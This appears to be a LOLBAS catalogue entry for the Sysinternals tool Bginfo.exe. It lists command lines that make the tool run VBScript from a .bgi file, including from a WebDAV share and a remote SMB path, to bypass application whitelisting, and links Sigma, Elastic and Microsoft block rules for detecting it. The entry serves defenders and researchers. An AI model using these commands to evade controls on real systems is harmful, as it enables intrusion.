---
Acknowledgement:
- Person: Oddvar
Author: Oddvar Moe
Commands:
- Category: Execute
  Command: bginfo.exe {PATH:.bgi} /popup /nolicprompt
  Description: Execute VBscript code that is referenced within the specified .bgi
    file.
  MitreID: T1218
  OperatingSystem: Windows
  Privileges: User
  Tags:
  - Execute: WSH
  Usecase: Local execution of VBScript
- Category: AWL Bypass
  Command: bginfo.exe {PATH:.bgi} /popup /nolicprompt
  Description: Execute VBscript code that is referenced within the specified .bgi
    file.
  MitreID: T1218
  OperatingSystem: Windows
  Privileges: User
  Tags:
  - Execute: WSH
  Usecase: Local execution of VBScript
- Category: Execute
  Command: \\10.10.10.10\webdav\bginfo.exe {PATH:.bgi} /popup /nolicprompt
  Description: Execute bginfo.exe from a WebDAV server.
  MitreID: T1218
  OperatingSystem: Windows
  Privileges: User
  Tags:
  - Execute: WSH
  Usecase: Remote execution of VBScript
- Category: AWL Bypass
  Command: \\10.10.10.10\webdav\bginfo.exe {PATH:.bgi} /popup /nolicprompt
  Description: Execute bginfo.exe from a WebDAV server.
  MitreID: T1218
  OperatingSystem: Windows
  Privileges: User
  Tags:
  - Execute: WSH
  Usecase: Remote execution of VBScript
- Category: Execute
  Command: \\live.sysinternals.com\Tools\bginfo.exe {PATH_SMB:.bgi} /popup /nolicprompt
  Description: This style of execution may not longer work due to patch.
  MitreID: T1218
  OperatingSystem: Windows
  Privileges: User
  Tags:
  - Execute: WSH
  - Execute: Remote
  Usecase: Remote execution of VBScript
- Category: AWL Bypass
  Command: \\live.sysinternals.com\Tools\bginfo.exe {PATH_SMB:.bgi} /popup /nolicprompt
  Description: This style of execution may not longer work due to patch.
  MitreID: T1218
  OperatingSystem: Windows
  Privileges: User
  Tags:
  - Execute: WSH
  - Execute: Remote
  Usecase: Remote execution of VBScript
Created: 2018-05-25
Description: Background Information Utility included with SysInternals Suite
Detection:
- Sigma: https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_lolbin_bginfo.yml
- Elastic: https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_unusual_process_network_connection.toml
- Elastic: https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_network_connection_from_windows_binary.toml
- BlockRule: https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules
Full_Path:
- Path: no default
Name: Bginfo.exe
Resources:
- Link: https://oddvar.moe/2017/05/18/bypassing-application-whitelisting-with-bginfo/
mitre_data:
  technique_ids:
  - T1218
tags:
- lolbas/othermsbinaries
---

# Bginfo.exe

Background Information Utility included with SysInternals Suite

# Path(s)

- `no default`

# AWL Bypass Commands

Execute VBscript code that is referenced within the specified .bgi file.

```batch
bginfo.exe {PATH:.bgi} /popup /nolicprompt
```

- **Usecase:** Local execution of VBScript
- **Privileges Required:** User
- **MitreID:** `T1218`
- **Operating System(s):** Windows



Execute bginfo.exe from a WebDAV server.

```batch
\\10.10.10.10\webdav\bginfo.exe {PATH:.bgi} /popup /nolicprompt
```

- **Usecase:** Remote execution of VBScript
- **Privileges Required:** User
- **MitreID:** `T1218`
- **Operating System(s):** Windows



This style of execution may not longer work due to patch.

```batch
\\live.sysinternals.com\Tools\bginfo.exe {PATH_SMB:.bgi} /popup /nolicprompt
```

- **Usecase:** Remote execution of VBScript
- **Privileges Required:** User
- **MitreID:** `T1218`
- **Operating System(s):** Windows



# Execute Commands

Execute VBscript code that is referenced within the specified .bgi file.

```batch
bginfo.exe {PATH:.bgi} /popup /nolicprompt
```

- **Usecase:** Local execution of VBScript
- **Privileges Required:** User
- **MitreID:** `T1218`
- **Operating System(s):** Windows



Execute bginfo.exe from a WebDAV server.

```batch
\\10.10.10.10\webdav\bginfo.exe {PATH:.bgi} /popup /nolicprompt
```

- **Usecase:** Remote execution of VBScript
- **Privileges Required:** User
- **MitreID:** `T1218`
- **Operating System(s):** Windows



This style of execution may not longer work due to patch.

```batch
\\live.sysinternals.com\Tools\bginfo.exe {PATH_SMB:.bgi} /popup /nolicprompt
```

- **Usecase:** Remote execution of VBScript
- **Privileges Required:** User
- **MitreID:** `T1218`
- **Operating System(s):** Windows



# Resource(s)

- https://oddvar.moe/2017/05/18/bypassing-application-whitelisting-with-bginfo/
# Acknowledgements

- Oddvar Moe (Authored, 2018-05-25)
- Oddvar